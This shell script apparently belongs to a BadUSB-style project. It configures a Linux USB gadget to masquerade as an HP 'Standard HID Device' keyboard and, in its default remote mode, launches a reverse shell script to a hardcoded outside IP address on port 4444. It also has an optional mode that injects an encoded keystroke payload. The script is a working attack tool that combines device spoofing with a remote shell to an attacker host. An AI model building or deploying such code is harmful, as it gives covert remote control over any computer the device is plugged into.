#!/bin/sh

MODE_DRIVEBY=false
DRIVEBY_SCRIPT="rickroll.txt"
MODE_REMOTE=true

# find working dir of script
wdir=$( cd $(dirname $BASH_SOURCE[0]) && cd .. && pwd)

GADGETS_DIR="keyboard_gadget"

cd /sys/kernel/config/usb_gadget
	mkdir -p $GADGETS_DIR
	cd $GADGETS_DIR

# configure gadget details
# =========================
# set Vendor ID
echo 0x1d6b > idVendor
echo 0x0104 > idProduct
# set device version 1.0.0
echo 0x0100 > bcdDevice
# set USB mode to USB 2.0
echo 0x0200 > bcdUSB

#composite class / subclass / proto (needs single configuration)
#echo 0xEF > bDeviceClass
#echo 0x02 > bDeviceSubClass
#echo 0x01 > bDeviceProtocol

# set device descriptions
mkdir -p strings/0x409 # English language strings
# set serial
echo "696969" > strings/0x409/serialnumber
# set manufacturer
echo "HP" > strings/0x409/manufacturer
# set product
echo "Standard HID Device" > strings/0x409/product

mkdir -p functions/hid.usb0
mkdir configs/c.1
echo 1 > functions/hid.usb0/protocol
echo 1 > functions/hid.usb0/subclass
echo 8 > functions/hid.usb0/report_length
echo -ne \\x05\\x01\\x09\\x06\\xa1\\x01\\x05\\x07\\x19\\xe0\\x29\\xe7\\x15\\x00\\x25\\x01\\x75\\x01\\x95\\x08\\x81\\x02\\x95\\x01\\x75\\x08\\x81\\x03\\x95\\x05\\x75\\x01\\x05\\x08\\x19\\x01\\x29\\x05\\x91\\x02\\x95\\x01\\x75\\x03\\x91\\x03\\x95\\x06\\x75\\x08\\x15\\x00\\x25\\x65\\x05\\x07\\x19\\x00\\x29\\x65\\x81\\x00\\xc0 > functions/hid.usb0/report_desc
echo 250 > configs/c.1/MaxPower
echo 0x80 > configs/c.1/bmAttributes #  USB_OTG_SRP | USB_OTG_HNP
ln -s functions/hid.usb0 configs/c.1/

#mount device
#rmmod g_ether
ls /sys/class/udc > UDC


if $MODE_REMOTE; then
    sleep 1
    python $wdir/boot/reverseshell.py 104.248.157.103 4444 &
fi

if $MODE_DRIVEBY; then
   sleep 5
   python $wdir/dakencoder/dakencoder.py $wdir/dakencoder/$DRIVEBY_SCRIPT
fi
